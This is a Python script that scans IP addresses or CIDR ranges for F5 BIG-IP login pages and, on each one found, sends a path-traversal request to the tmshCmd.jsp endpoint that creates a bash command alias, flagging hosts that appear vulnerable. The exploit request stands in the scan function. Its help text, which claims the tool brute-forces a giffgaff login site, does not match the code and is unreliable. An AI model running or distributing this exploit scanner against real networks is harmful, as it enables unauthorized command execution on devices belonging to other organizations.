import sys
import re
import requests
import argparse
import json
from netaddr import IPNetwork
from threads import ThreadPool
from logger import logging

requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass


def keyword_scan(req):
    checkwords = re.compile(r"big-ip|BIG-IP|F5_CURRENT_PARTITION|F5 Networks Logo|F5 Networks|f5formpage")
    if checkwords.search(req.lower()):
        return True

def scan(ip):
    try:
        f5_scan = requests.get('https://'+str(ip)+"/tmui/login.jsp",verify=False,timeout=3)

        if keyword_scan(f5_scan.text):
            logging.warning("[+] Target {} looks like an F5".format(ip))

            tmshCmd_url = "https://"+ip+"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"

            r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,timeout=3)
            response_str = json.dumps(r.headers.__dict__['_store'])
            if r.status_code == 200:
                logging.warning("[+] Target {} responds on 443".format(r.status_code))
                if 'tmui' in response_str:
                    logging.warning("[+] Target {} appears vulnerable".format(ip))
            else:
                logging.warning("\t [-] Target {} does not appear vulnerable".format(ip))
        else:
            logging.error("[-] Target {} response on 443 was successfull but not an F5".format(ip))

    except ( KeyboardInterrupt,requests.exceptions.ConnectionError ) as e:
        if "key" in str(e):
            logging.critical("Pressed CTRL+C, waiting for processes to close. process number {}".format(ThreadPool.count(pool)))
        else:
            if "connect timeout" in str(e):
                logging.info("[-] Target {} port 443 not responding".format(ip))
            elif "Connection Refused" in str(e):
                logging.info("[-] Target {} port 443 connection refused".format(ip))

def main(argv):
    # define the program description
    text = 'A Python program that bruteforce id.giffgaff.com. Written by ccc.'
    # initiate the parser with a description
    parser = argparse.ArgumentParser(description=text)
    parser.add_argument('--ip', '-i', help='provide single ip')
    parser.add_argument('--cidr','-c',help='provide a cidr range, Eg: 192.168.0.0/24')
    parser.add_argument('--file','-f',help='provide a cidr range, Eg: 192.168.0.0/24')
    parser.parse_args()

    # read arguments from the command line
    args = parser.parse_args()
    ip = args.ip
    cidr = args.cidr
    file = args.file

    if cidr:
        cidr = IPNetwork(args.cidr)
    elif ip:
        cidr = [ ip ]
    elif file:
        with open(file,'r')  as scanlist:
            cidr = scanlist.readlines()
    else:
        sys.exit()

    pool = ThreadPool(30)

    try:
        for ip in cidr:
            pool.add_task(scan,ip.rstrip())
        pool.wait_completion()
    except KeyboardInterrupt:
        logging.critical("CTRL+C Pressed. gracefully closing threads...")
        pool.wait_completion()
        sys.exit()


if __name__ == "__main__":
    main(sys.argv[1:])